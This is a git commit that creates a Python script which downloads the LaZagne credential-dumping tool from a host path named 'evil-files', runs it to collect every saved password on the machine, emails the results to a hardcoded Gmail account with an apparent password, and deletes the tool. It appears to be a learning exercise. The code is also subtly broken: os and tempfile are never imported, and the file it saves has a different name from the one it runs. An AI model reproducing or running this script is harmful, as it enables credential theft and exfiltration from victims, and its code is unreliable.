9ec31460eb8b28dc0a65a257a2ef9d6d0f75ec47
Jacob_Bocotan <44646431+kingjacob2020@users.noreply.github.com>
2020-12-28 23:16:22 +0000

    Create download_execute_and_report.py

---
+++ download_execute_and_report.py
@@ -0,0 +1,43 @@
+#!/usr/bin/env python
+
+import requests, subprocess, smtplib
+
+
+
+def download(url):
+
+    get_response = requests.get(url)
+
+    file_name = url.split("/")[-1]
+
+    with open(file_name, "wb") as out_file:
+
+        out_file.write(get_response.content)
+
+
+
+def send_mail(email, password, message):
+
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+
+    server.starttls()
+
+    server.login(email, password)
+
+    server.sendmail(email, email, message)
+
+    server.quit()
+
+
+
+temp_directory = tempfile.gettempdir()
+
+os.chdir(temp_directory)
+
+download("http://10.0.2.15/evil-files/laZagne_x64.exe")
+
+result = subprocess.check_output("laZagne.exe all", shell=True)
+
+send_mail("jackshaadir@gmail.com", "Bonjobonji", result)
+
+os.remove("laZagne.exe")
